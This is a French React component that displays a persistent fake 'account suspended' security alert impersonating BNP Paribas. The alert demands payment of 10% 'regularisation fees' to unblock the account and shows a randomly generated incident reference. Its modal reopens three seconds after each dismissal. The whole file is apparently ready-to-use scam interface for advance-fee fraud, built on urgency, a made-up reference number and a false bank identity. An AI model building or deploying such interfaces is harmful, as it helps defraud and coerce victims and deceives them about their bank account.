import { useEffect, useRef, useState } from 'react';

/**
 * BlockAlert : alerte de sécurité PERSISTANTE
 * - Bandeau professionnel discret en haut de page, toujours visible
 * - Modale centrale qui réapparaît automatiquement 3 secondes
 *   après chaque fermeture, tant que le compte n'est pas débloqué
 * - Design entièrement responsive (mobile / tablette / desktop)
 */
const BlockAlert = ({ userName }) => {
  const [modalVisible, setModalVisible] = useState(true);
  const [bandVisible, setBandVisible] = useState(false);
  const timerRef = useRef(null);

  // Fermer la modale → la réouvrir automatiquement après 3 secondes
  const closeModal = () => {
    setModalVisible(false);
    if (timerRef.current) clearTimeout(timerRef.current);
    timerRef.current = setTimeout(() => {
      setModalVisible(true);
    }, 3000);
  };

  useEffect(() => {
    // Animation d'entrée du bandeau
    const bandTimer = setTimeout(() => setBandVisible(true), 100);
    return () => {
      if (timerRef.current) clearTimeout(timerRef.current);
      clearTimeout(bandTimer);
    };
  }, []);

  return (
    <>
      {/* ============================================================
          BANDEAU SUPÉRIEUR PROFESSIONNEL — toujours visible
      ============================================================= */}
      <div
        data-testid="block-alert-band"
        style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          zIndex: 10001,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          gap: '10px',
          padding: '10px 16px',
          background: 'linear-gradient(90deg, #7f1d1d 0%, #b91c1c 45%, #dc2626 65%, #b91c1c 100%)',
          borderBottom: '1px solid rgba(0,0,0,0.15)',
          boxShadow: '0 2px 8px rgba(0,0,0,0.25)',
          opacity: bandVisible ? 1 : 0,
          transform: bandVisible ? 'translateY(0)' : 'translateY(-100%)',
          transition: 'opacity 0.4s ease, transform 0.4s ease',
        }}
      >
        {/* Icône bouclier */}
        <div
          style={{
            width: 22,
            height: 22,
            minWidth: 22,
            borderRadius: '50%',
            background: 'rgba(255,255,255,0.15)',
            border: '1px solid rgba(255,255,255,0.4)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '12px',
            fontWeight: 700,
            color: '#fff',
          }}
        >
          !
        </div>

        {/* Message professionnel */}
        <p
          style={{
            margin: 0,
            color: '#fff',
            fontSize: 'clamp(0.72rem, 1.3vw, 0.85rem)',
            fontWeight: 500,
            letterSpacing: '0.3px',
            textAlign: 'center',
            lineHeight: 1.35,
            maxWidth: '720px',
            fontFamily: "'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif",
          }}
        >
          <span style={{ fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.6px' }}>
            Avis de sécurité
          </span>
          <span style={{ margin: '0 8px', opacity: 0.45 }}>|</span>
          <span className="block-alert-message-text">
            Votre compte est suspendu. La régularisation des frais en attente est requise pour rétablir l'accès à vos services.
          </span>
        </p>
      </div>

      {/* ============================================================
          MODALE CENTRALE — réapparaît 3 s après chaque fermeture
      ============================================================= */}
      {modalVisible && (
        <div
          data-testid="block-alert-modal"
          style={{
            position: 'fixed',
            inset: 0,
            zIndex: 10002,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '16px',
            background: 'rgba(10, 15, 25, 0.78)',
            backdropFilter: 'blur(5px)',
            WebkitBackdropFilter: 'blur(5px)',
            animation: 'ba-fade-in 0.35s ease',
          }}
          onMouseDown={(e) => e.stopPropagation()}
        >
          <div
            onMouseDown={(e) => e.stopPropagation()}
            style={{
              background: '#ffffff',
              borderRadius: '14px',
              width: '100%',
              maxWidth: '440px',
              maxHeight: 'calc(100vh - 120px)',
              overflowY: 'auto',
              boxShadow: '0 24px 64px rgba(0,0,0,0.55)',
              border: '1px solid rgba(220, 38, 38, 0.4)',
              borderTop: '4px solid #b91c1c',
              animation: 'ba-zoom-in 0.35s ease',
              fontFamily: "'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif",
            }}
          >
            {/* En-tête */}
            <div
              style={{
                padding: '20px 22px 16px 22px',
                borderBottom: '1px solid #f1e5e5',
                display: 'flex',
                alignItems: 'flex-start',
                gap: '14px',
              }}
            >
              <div
                style={{
                  width: 40,
                  height: 40,
                  minWidth: 40,
                  borderRadius: '50%',
                  background: '#fef2f2',
                  border: '2px solid #fecaca',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '1.15rem',
                  animation: 'ba-shake 1.4s ease infinite',
                }}
              >
                ⚠️
              </div>
              <div>
                <p
                  style={{
                    margin: 0,
                    fontSize: 'clamp(1rem, 2.2vw, 1.15rem)',
                    fontWeight: 700,
                    color: '#7f1d1d',
                    letterSpacing: '0.2px',
                  }}
                >
                  Alerte sécurité — Compte suspendu
                </p>
                <p
                  style={{
                    margin: '4px 0 0 0',
                    fontSize: '0.8rem',
                    color: '#9ca3af',
                    fontWeight: 500,
                  }}
                >
                  Référence incident : SEC-{new Date().getFullYear()}-{String(Math.floor(Math.random() * 9000) + 1000)}
                </p>
              </div>
            </div>

            {/* Corps du message */}
            <div style={{ padding: '18px 22px 6px 22px', color: '#334155' }}>
              <p style={{ margin: '0 0 10px 0', fontSize: '0.95rem', fontWeight: 600, color: '#1e293b' }}>
                {userName ? `Bonjour ${userName},` : 'Bonjour,'}
              </p>
              <p style={{ margin: 0, fontSize: '0.9rem', lineHeight: 1.65 }}>
                Nous vous informons que votre compte a été <strong style={{ color: '#b91c1c' }}>suspendu à titre conservatoire</strong>.
                Afin de procéder à son déblocage, il est nécessaire de <strong>s'acquitter des frais de régularisation de 10% </strong> actuellement en attente.
                Veuillez vous rendre dans votre agence BNP Paribas la plus proche pour effectuer cette régularisation et rétablir l'accès à vos services.
              </p>
              <p style={{ margin: '10px 0 0 0', fontSize: '0.9rem', lineHeight: 1.65 }}>
                Nous vous remercions de votre compréhension et de votre coopération.
              </p>
              <div
                style={{
                  marginTop: 14,
                  background: '#fef2f2',
                  border: '1px solid #fecaca',
                  borderLeft: '3px solid #dc2626',
                  borderRadius: '8px',
                  padding: '12px 14px',
                  fontSize: '0.85rem',
                  lineHeight: 1.6,
                  color: '#7f1d1d',
                }}
              >
                <strong>Information importante :</strong> tant que la régularisation n'est pas effectuée,
                l'ensemble des opérations (virements, paiements, retraits) demeurent suspendues.
              </div>
            </div>

            {/* Pied : bouton unique */}
            <div style={{ padding: '14px 22px 20px 22px', display: 'flex', justifyContent: 'center' }}>
              <button
                type="button"
                data-testid="block-alert-acknowledge"
                onClick={closeModal}
                style={{
                  background: '#b91c1c',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '9px',
                  padding: '12px 28px',
                  width: '100%',
                  maxWidth: '260px',
                  fontSize: '0.9rem',
                  fontWeight: 600,
                  cursor: 'pointer',
                  boxShadow: '0 3px 10px rgba(185, 28, 28, 0.35)',
                  transition: 'background 0.2s ease, transform 0.15s ease',
                }}
                onMouseEnter={(e) => { e.currentTarget.style.background = '#991b1b'; e.currentTarget.style.transform = 'translateY(-1px)'; }}
                onMouseLeave={(e) => { e.currentTarget.style.background = '#b91c1c'; e.currentTarget.style.transform = 'translateY(0)'; }}
              >
                J'ai pris note
              </button>
            </div>
          </div>
        </div>
      )}

      <style>{`
        @keyframes ba-fade-in {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes ba-zoom-in {
          from { opacity: 0; transform: scale(0.92); }
          to { opacity: 1; transform: scale(1); }
        }
        @keyframes ba-shake {
          0%, 100% { transform: rotate(0deg); }
          20% { transform: rotate(-6deg); }
          40% { transform: rotate(6deg); }
          60% { transform: rotate(-4deg); }
          80% { transform: rotate(4deg); }
        }
        /* Responsive : sur mobile, texte du bandeau en deux lignes compactes */
        @media (max-width: 640px) {
          .block-alert-message-text {
            display: block;
          }
        }
      `}</style>
    </>
  );
};

export default BlockAlert;
